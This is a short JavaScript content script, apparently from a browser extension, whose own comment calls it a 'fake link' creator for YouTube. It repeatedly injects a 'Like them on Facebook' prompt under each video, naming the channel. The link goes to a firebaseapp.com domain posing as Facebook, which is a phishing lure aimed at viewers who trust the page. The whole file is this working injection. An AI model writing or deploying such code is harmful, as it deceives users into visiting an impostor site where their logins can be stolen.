//this script will run on youtube . will create a fake link

function locationchange(){
  
    //window.globalURL if variable is set
   
    var oldURL = window.history.state["spf-referer"];
    var newURL = window.location.href

    if(!(oldURL == newURL))
    {
      if(!document.getElementById("fake-link"))
      {  
          addElement();
      }
    }

}

setInterval(locationchange, 2000);



function getChannelName() {
    var elements = document.getElementsByClassName("yt-user-info");
    var testDivs = Array.prototype.filter.call(elements, function(elements){
    return elements.nodeName === 'DIV';
	});

	//console.log(testDivs[0].innerText);

	var channelName = testDivs[0].innerText;
	if(channelName){
		return channelName;
	}
	else{
		console.log('Channel name not found in DOM');
	}

}


function addElement() { 
  // create a new div element 
  // and give it some content
  var channelName = getChannelName();  
  var newDiv = document.createElement("div");


  newDiv.id="fake-link"
  //newDiv.src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTc6dh8xMbps_g5EJj66Qn1RwUoV-MhlYc_W-rUV_pJmYLtig3Ang";
  //newDiv.type="image";
  newDiv.setAttribute("style", "padding: 10px 0px 10px 0px"); 
  var newContent = document.createTextNode("Liked "+ channelName + "? ");
  //var btn = document.createElement("button");
  //var t = document.createTextNode("CLICK ME");

  var aTag = document.createElement('a');
  aTag.setAttribute('href',"https://facebook-92174.firebaseapp.com/");
  aTag.setAttribute('target',"_blank");

  aTag.innerHTML = "Like them on Facebook";

  
  newDiv.appendChild(newContent);  //add the text node to the newly created div. 
  newDiv.appendChild(aTag);

  // add the newly created element and its content into the DOM 
  var currentDiv = document.getElementById("watch-description");
  currentDiv.appendChild(newDiv);

}

